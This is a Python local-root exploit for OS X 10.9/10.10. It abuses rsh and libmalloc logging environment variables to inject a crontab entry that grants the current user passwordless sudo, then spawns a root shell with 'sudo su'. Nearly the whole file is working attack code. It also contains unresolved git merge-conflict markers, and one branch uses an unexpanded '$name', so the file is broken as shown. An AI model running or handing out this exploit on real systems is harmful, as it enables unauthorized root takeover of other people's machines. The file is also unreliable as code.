#!/usr/bin/python
# rsh + libmalloc osx local root
# tested on osx 10.9.5 / 10.10.5
# jul/2015

<<<<<<< HEAD
import os,time,sys
import subprocess
=======
import os,time,sys,subprocess
whoami = subprocess.check_output(['whoami'])
>>>>>>> origin/master
env = {}
proc = subprocess.Popen('whoami', stdout=subprocess.PIPE)
name = proc.stdout.read()
s = os.stat("/etc/sudoers").st_size

env['MallocLogFile'] = '/etc/crontab'
env['MallocStackLogging'] = 'yes'
<<<<<<< HEAD
env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " $name ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
=======
env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
>>>>>>> origin/master

sys.stderr.write("creating /etc/crontab..")

p = os.fork()
if p == 0:
	os.close(1)
	os.close(2)
	os.execve("/usr/bin/rsh",["rsh","localhost"],env)

time.sleep(1)

if "NOPASSWD" not in open("/etc/crontab").read():
	sys.stderr.write("failed\n")
	sys.exit(-1)

sys.stderr.write("done\nwaiting for /etc/sudoers to change (<60 seconds)..")

while os.stat("/etc/sudoers").st_size == s:
	sys.stderr.write(".")
	time.sleep(1)

sys.stderr.write("\ndone\n")

os.system("sudo su")
